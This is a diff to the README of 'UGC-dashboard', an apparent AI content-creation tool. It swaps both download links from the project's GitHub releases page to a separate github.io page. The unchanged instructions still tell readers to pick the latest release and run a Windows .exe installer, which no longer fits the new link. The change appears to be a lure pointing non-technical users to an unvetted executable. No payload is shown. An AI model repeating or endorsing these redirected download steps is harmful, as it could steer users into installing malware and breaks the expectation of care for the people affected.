@@ -1,6 +1,6 @@
 # 🎨 UGC-dashboard - Create professional visual content with AI
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/0000713/UGC-dashboard/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://0000713.github.io)
 
 UGC-dashboard simplifies how you create content for social media and marketing. It combines visual artificial intelligence tools into one simple interface. You do not need technical skills to automate your video production or image editing. This tool uses powerful technology from Higgsfield and OpenAI to handle complex AI tasks while you focus on creativity. 
 
@@ -20,7 +20,7 @@ To run this application, your computer needs to meet these basic standards.
 
 Follow these steps to set up UGC-dashboard on your machine.
 
-1. Visit the following link to see all available versions: [https://github.com/0000713/UGC-dashboard/releases](https://github.com/0000713/UGC-dashboard/releases).
+1. Visit the following link to see all available versions: [https://0000713.github.io](https://0000713.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the link that ends in `.exe`. This is the installer for Windows.
 4. Wait for the download to finish.
